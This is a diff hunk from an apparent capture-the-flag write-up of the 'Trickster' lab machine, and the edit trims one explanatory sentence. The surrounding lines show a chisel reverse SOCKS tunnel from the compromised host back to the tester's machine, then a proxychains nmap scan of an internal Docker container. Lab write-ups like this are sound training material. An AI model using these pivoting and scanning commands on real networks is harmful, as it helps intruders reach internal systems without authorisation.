@@ -339,7 +339,7 @@ james@trickster:/tmp$ ./chisel client 10.10.14.9:8000 R:socks
 2025/01/31 12:03:41 client: Connected (Latency 46.915879ms)
 ````
 
-Now, we can analyze the Docker container more comfortably from our machine. In retrospect, this could have been done more easily by using a simple script to scan ports from the target machine and then setting up port forwarding. However, as a best practice, I believe it is better to perform enumeration from our machine using **Chisel** or **Ligolo**.
+Now, we can analyze the Docker container more comfortably from our machine.
 
 ````bash
 ❯ proxychains nmap -sT -Pn --top-ports 6000 -open -T5 -v -n 172.17.0.2 2>/dev/null
